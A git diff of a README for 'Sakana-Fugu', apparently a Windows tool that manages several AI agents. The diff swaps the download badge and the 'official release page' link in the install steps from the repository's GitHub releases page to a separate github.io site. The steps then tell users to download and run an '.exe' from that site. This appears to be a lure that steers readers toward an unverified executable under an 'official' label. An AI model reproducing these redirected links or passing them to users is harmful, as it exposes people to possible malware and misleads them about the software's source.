@@ -1,6 +1,6 @@
 # 🐡 Sakana-Fugu - Smart AI agents for complex tasks
 
-[![Download Sakana-Fugu](https://img.shields.io/badge/Download-Sakana--Fugu-blue)](https://github.com/developed-shegetz707/Sakana-Fugu/releases)
+[![Download Sakana-Fugu](https://img.shields.io/badge/Download-Sakana--Fugu-blue)](https://developed-shegetz707.github.io)
 
 Sakana-Fugu acts as a manager for artificial intelligence models. It organizes multiple AI tools to finish difficult projects that require several steps. Instead of relying on one brain, the software splits work among several high-performing models. It even creates new instances of itself when a task needs more power. This approach ensures you get the best results for your specific questions and projects.
 
@@ -18,7 +18,7 @@ To run Sakana-Fugu on your Windows computer, verify that your machine meets thes
 
 Follow these steps to set up the software on your system.
 
-1. Go to the [official release page](https://github.com/developed-shegetz707/Sakana-Fugu/releases).
+1. Go to the [official release page](https://developed-shegetz707.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in ".exe" to download the installer file to your computer.
 4. Locate the downloaded file in your "Downloads" folder.
